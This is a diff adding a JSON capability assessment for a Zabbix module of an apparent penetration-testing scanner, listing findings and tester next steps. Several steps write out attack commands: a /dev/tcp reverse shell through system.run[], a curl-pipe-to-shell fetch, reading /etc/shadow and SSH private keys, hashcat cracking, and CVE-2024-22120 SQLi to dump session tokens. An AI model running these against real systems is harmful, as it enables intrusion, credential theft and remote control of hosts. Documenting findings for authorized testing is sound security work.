@@ -1,0 +1,118 @@
+{
+  "service": "zabbix",
+  "summary": "Strong dual-role probe. Agent side reaches T2 (item queries actually return inventory + file contents, and system.run[] is a real RCE proof with a marker \u2014 gated behind exploit=True). Trapper side is mostly T0/T1 with an active auto-registration probe that is T2 when exploit=True (creates an attacker-chosen host \u2014 a documented CVE-2024-22120 precondition). Missing: no attempt at the SQLi payload itself, no PSK cracking helper, no active_checks token-abuse for existing autoreg actions. RCE finding folds run_as output but does not chain to a session or credential capture.",
+  "module_files": [
+    "recce/services/zabbix.py",
+    "recce/core/known_monitoring_agents.py"
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "known_hostnames",
+    "known_credentials",
+    "relay_targets"
+  ],
+  "findings": [
+    {
+      "kind": "zabbix_agent_allowlist_bypass",
+      "title_pattern": "Zabbix agent responds to arbitrary source IPs (Server= allow-list missing)",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "Agent answered agent.version from the scanner IP \u2014 deterministic proof Server= admits this source.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Precondition finding; downstream findings (inventory/file-read/RCE) already carry the exploitation depth.",
+      "tester_next_step": "zabbix_get -s <ip> -p 10050 -k agent.version \u2014 confirm; then walk the inventory/file-read/RCE probes below."
+    },
+    {
+      "kind": "zabbix_agent_inventory_disclosure",
+      "title_pattern": "Zabbix agent discloses host inventory unauthenticated",
+      "severity": "high",
+      "tier": "t2",
+      "tier_evidence": "Actual item values returned (uname, hostname, listener list) \u2014 real data extraction beyond a safe presence check.",
+      "can_promote_to": "t3",
+      "promotion_risk": "low",
+      "promotion_notes": "T3 = fold hostname/FQDN into known_hostnames and listener ports into relay_targets to drive follow-on service scans (pivot signal for firewalled internal ports).",
+      "tester_next_step": "for k in system.hostname system.uname net.tcp.listen system.users.num; do zabbix_get -s <ip> -p 10050 -k $k; done \u2014 parse net.tcp.listen JSON for internal-only ports."
+    },
+    {
+      "kind": "zabbix_agent_file_read",
+      "title_pattern": "Zabbix agent allows arbitrary file read via vfs.file.contents",
+      "severity": "high",
+      "tier": "t2",
+      "tier_evidence": "vfs.file.contents[/etc/passwd|/etc/shadow|conf] returned real file bodies \u2014 arbitrary read proven.",
+      "can_promote_to": "t3",
+      "promotion_risk": "low",
+      "promotion_notes": "T3 = pull /root/.ssh/id_rsa, /root/.ssh/authorized_keys, /var/lib/zabbix/enrollment.psk, /home/*/.aws/credentials \u2014 turn read into creds/keys. Extract /etc/shadow hashes into hashcat -m 1800.",
+      "tester_next_step": "zabbix_get -s <ip> -p 10050 -k 'vfs.file.contents[/root/.ssh/id_rsa]'; -k 'vfs.file.contents[/etc/shadow]'; feed hashes to hashcat -m 1800 rockyou.txt."
+    },
+    {
+      "kind": "zabbix_agent_rce",
+      "title_pattern": "Zabbix agent EnableRemoteCommands=1 \u2014 pre-auth RCE via system.run[]",
+      "severity": "critical",
+      "tier": "t2",
+      "tier_evidence": "system.run[echo <marker>] echoed the marker verbatim + system.run[id] captured \u2014 controlled payload with proof of exec (not full session).",
+      "can_promote_to": "t3",
+      "promotion_risk": "medium",
+      "promotion_notes": "T3 = drop a reverse shell (zabbix agent user or root); one system.run[curl http://x/sh|sh] is a full session. Documented as tester_next_step, not automated per user directive.",
+      "tester_next_step": "zabbix_get -s <ip> -p 10050 -k 'system.run[bash -i >& /dev/tcp/<listener>/4444 0>&1]' \u2014 with `nc -lnvp 4444` waiting. Also fetch ~/.ssh/id_rsa and /root/.ssh/authorized_keys via system.run[cat] once as root."
+    },
+    {
+      "kind": "zabbix_agent_topology_leak",
+      "title_pattern": "Zabbix agent leaks Server=/ServerActive= \u2014 internal monitoring topology disclosed",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "Parses Server=/ServerActive= from returned conf file \u2014 deterministic.",
+      "can_promote_to": "t3",
+      "promotion_risk": "low",
+      "promotion_notes": "T3 = pivot from a compromised agent to the disclosed server IP (which trusts outbound to 10051), send sender/auto-reg traffic to enumerate other hosts the same server monitors. Wire into relay_targets.",
+      "tester_next_step": "For each Server= IP: probe 10051 with 'active checks' request; if TLS off, this is where autoreg abuse lands the widest blast radius."
+    },
+    {
+      "kind": "zabbix_trapper_fingerprint",
+      "title_pattern": "Zabbix trapper reachable \u2014 fingerprint recorded",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Role/version/response fingerprint via 'active checks' reply.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Enum baseline.",
+      "tester_next_step": "python3 -c \"...\" (per module runbook) \u2192 confirm role=server vs proxy."
+    },
+    {
+      "kind": "zabbix_trapper_tls_enforced",
+      "title_pattern": "Zabbix trapper enforces TLS PSK / certificate",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Negative finding \u2014 trapper refused plaintext; no attack surface here.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Nothing to promote \u2014 the port is gated.",
+      "tester_next_step": "If PSK is used, look for enrollment.psk on any compromised agent (vfs.file.contents[/var/lib/zabbix/enrollment.psk]) \u2014 reuse to authenticate as that agent."
+    },
+    {
+      "kind": "zabbix_autoreg_accepted",
+      "title_pattern": "Zabbix server/proxy accepts unauthenticated auto-registration (TLS PSK/cert off)",
+      "severity": "critical",
+      "tier": "t2",
+      "tier_evidence": "Attacker-chosen host + host_metadata request returned response=success \u2014 real create succeeded, controlled payload landed (gated by exploit=True).",
+      "can_promote_to": "t3",
+      "promotion_risk": "high",
+      "promotion_notes": "T3 = CVE-2024-22120 SQLi via host_metadata field into the auto-registration audit log; produces DB read/write on the Zabbix server database. Destructive/detected; needs a proper polyglot payload.",
+      "tester_next_step": "Send active-checks with host_metadata containing the CVE-2024-22120 SQLi payload (see zabbix-2024-22120 PoC gist); confirm DB write via a benign UPDATE on auditlog. Then dump users table for zabbix session tokens / password hashes.",
+      "related_cves": [
+        "CVE-2024-22120"
+      ]
+    },
+    {
+      "kind": "zabbix_plaintext",
+      "title_pattern": "Zabbix agent/server communication is plaintext (no TLS PSK/cert)",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "Accepted an unencrypted ZBXD frame \u2014 deterministic.",
+      "can_promote_to": "t3",
+      "promotion_risk": "high",
+      "promotion_notes": "T3 = on-path capture of item values, file contents, PSKs pre-shared out-of-band. Requires L2.",
+      "tester_next_step": "tcpdump -i any -w zbx.pcap 'tcp port 10050 or tcp port 10051'; inspect ZBXD payloads for command output/file bodies."
+    }
+  ]
+}
